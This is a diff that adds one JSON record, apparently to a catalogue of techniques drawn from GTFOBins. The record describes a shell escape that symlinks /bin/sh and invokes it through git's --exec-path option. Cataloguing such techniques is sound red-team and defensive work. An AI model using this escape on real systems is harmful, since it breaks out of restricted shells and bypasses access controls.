@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-git-shell-3",
+  "name": "GTFOBins · git (shell) #3",
+  "command": "ln -s /bin/sh git-x\ngit --exec-path=. x",
+  "description": "Use git to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "git",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/git/#shell",
+  "upstream_id": "git/shell/2",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/git/"
+    }
+  ]
+}
